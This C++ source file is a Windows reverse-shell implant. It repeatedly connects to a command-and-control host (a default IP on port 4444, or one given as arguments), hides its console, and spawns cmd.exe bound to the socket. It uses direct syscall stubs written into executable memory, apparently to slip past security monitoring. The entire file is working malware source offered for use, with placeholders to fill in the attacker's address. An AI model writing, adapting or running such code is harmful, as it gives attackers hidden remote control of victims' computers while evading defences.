#include <stdio.h>
#include <winsock2.h>
#include <iostream>
#include <cstdlib>
#include "winternl.h"
#include "getSyscall.h"
#pragma comment(lib,"ws2_32.lib") //Winsock Library
#pragma warning(disable:4996)

using myNtCreateProcessEx = NTSTATUS(NTAPI*)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, HANDLE ParentProcess, ULONG Flags, HANDLE SectionHandle OPTIONAL, HANDLE DebugPort OPTIONAL, HANDLE ExceptionPort OPTIONAL, BOOLEAN InJob);

void RunShell(char* C2Server, int C2Port) {
    while (true) {
        Sleep(5000);    // Five Second

        SOCKET mySocket;
        sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2, 2), &version);
        mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = inet_addr(C2Server);
        addr.sin_port = htons(C2Port);

        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
            continue;
        }
        else {
            char RecvData[1024];
            memset(RecvData, 0, sizeof(RecvData));
            char Process[] = "cmd.exe";
            STARTUPINFO sinfo;
            PROCESS_INFORMATION pinfo;
            memset(&sinfo, 0, sizeof(sinfo));
            sinfo.cb = sizeof(sinfo);
            sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;

            /* NtCreateProcessEx variables */
            myNtCreateProcessEx NtCreateProcessEx;
            char syscallStub_NtCreateProc[SYSCALL_STUB_SIZE] = {};
            DWORD oldProtection = 0;

            NtCreateProcessEx = (myNtCreateProcessEx)(LPVOID)syscallStub_NtCreateProc;
            VirtualProtect(syscallStub_NtCreateProc, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

            GetSyscallStub("NtCreateProcessEx", syscallStub_NtCreateProc);

            #define PS_INHERIT_HANDLES  4
            HANDLE hProcess;
            HANDLE hSection = NULL;
            OBJECT_ATTRIBUTES objattr;
            UNICODE_STRING objname;
            NTSTATUS status;
            WCHAR wstrObjName[MAX_PATH];
            lstrcpyW(wstrObjName, L"C:\\Windows\\System32\\cmd.exe");

            objname.Buffer = wstrObjName;
            objname.Length = wcslen(wstrObjName) * sizeof(WCHAR);
            objname.MaximumLength = MAX_PATH * sizeof(WCHAR);

            objattr.Length = sizeof(OBJECT_ATTRIBUTES);
            objattr.Attributes = 0X00000040L;
            objattr.ObjectName = NULL;
            objattr.RootDirectory = NULL;
            objattr.SecurityDescriptor = NULL;
            objattr.SecurityQualityOfService = NULL;

            status = NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), PS_INHERIT_HANDLES, NULL, NULL, NULL, false);
            DWORD pid = GetProcessId(hProcess);
            printf("PID = %d\n", pid);
            CloseHandle(hSection);
            CloseHandle(hProcess);
            //CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
            //WaitForSingleObject(pinfo.hProcess, INFINITE);
            //CloseHandle(pinfo.hProcess);
            //CloseHandle(pinfo.hThread);

            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(mySocket, RecvData, 1024, 0);
            if (RecvCode <= 0) {
                closesocket(mySocket);
                WSACleanup();
                continue;
            }
            if (strcmp(RecvData, "exit\n") == 0) {
                exit(0);
            }
        }
    }
}

/*else {
            char RecvData[1024];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(mySocket, RecvData, 1024, 0);
            if (RecvCode <= 0) {
                closesocket(mySocket);
                WSACleanup();
                continue;
            }
            */

int main(int argc, char* argv[])
{
    FreeConsole();
    if (argc == 3) {
        int port = atoi(argv[2]);
        RunShell(argv[1], port);
    }
    else {
        char host[] = "192.168.43.1";  // change this to your ip address
        int port = 4444;                //chnage this to your open port
        RunShell(host, port);
    }
    return 0;
}
